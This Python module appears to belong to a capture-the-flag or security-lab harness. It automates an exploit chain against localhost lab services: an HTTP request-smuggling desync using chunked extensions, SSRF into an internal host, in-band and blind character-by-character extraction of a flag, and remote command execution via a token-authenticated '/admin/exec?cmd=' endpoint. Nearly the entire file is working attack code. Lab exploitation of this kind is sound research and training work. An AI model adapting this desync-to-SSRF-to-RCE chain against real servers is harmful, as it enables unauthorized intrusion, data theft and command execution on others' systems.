import urllib.parse

from . import engine, exfil, fixtures
from .evidence import Evidence


def _sm_inner(pos: int, op: str, c: str) -> str:
    inner = f"/fsub?pos={pos}&op={urllib.parse.quote(op, safe='')}&c={c}"
    return urllib.parse.quote(inner, safe="")


def probe_composed(st, inner_path: str):
    sm = f"/internal?target=b&path={inner_path}"
    return engine.probe_desync(st, "chunked-ext", sm)


def ssrf_read(lab, ev, verify_upto: int = 4) -> dict:
    st = engine.FamilyState("desync", "127.0.0.1", lab.front_port)
    st.budget = 4
    inband = probe_composed(st, urllib.parse.quote("/flag", safe=""))
    flag = ""
    ok = inband.code == 200 and "flag:RECOIL{" in inband.body
    if ok:
        flag = inband.body.split("flag:", 1)[1].split(":", 1)[0]
        ev.verdict_ok("ssrf-composed-inband", host="origin->B", response=inband.body[:44])
    blind = {"hits": 0, "checks": 0}
    for n in range(1, verify_upto + 1):
        if not flag:
            break
        good = flag[n - 1]
        r_good = probe_composed(st, _sm_inner(n, "=", good))
        r_bad = probe_composed(st, _sm_inner(n, "=", "~"))
        ev.event("ssrf-blind", pos=n, good_shape=r_good.shape, bad_shape=r_bad.shape)
        blind["checks"] += 1
        if len(r_good.body) > len(r_bad.body) and "rows=1" in r_good.body:
            blind["hits"] += 1
    ev.verdict_ok("ssrf-composed-blind", checks=blind["checks"], hits=blind["hits"]) if blind["checks"] == blind["hits"] else ev.verdict_no(
        "ssrf-composed-blind", checks=blind["checks"], hits=blind["hits"]
    )
    return {"ok": ok, "inband_flag": flag, "blind": blind, "shape": "desync->internal->B", "reliability": (1.0 if ok else 0.0)}


def host_b_admin_exec(lab, ev, token: str) -> str:
    import hashlib
    marker = "RECOIL-rail-" + hashlib.sha256(token.encode()).hexdigest()[:8]
    hits = 0
    reps = 3
    for _ in range(reps):
        code, body, _ms = exfil.http_get(
            "127.0.0.1", lab.admin_port, f"/admin/exec?cmd=echo+{marker}", headers={"X-Auth": token}
        )
        if code == 200 and f"admin-exec:{marker}" in body:
            hits += 1
    ev.verdict_ok("rce-lateral-B", admin_port=lab.admin_port, marker=marker, reliability=hits / reps) if hits == reps else ev.verdict_no(
        "rce-lateral-B", admin_port=lab.admin_port, marker=marker, hits=hits
    )
    return marker if hits == reps else "failed"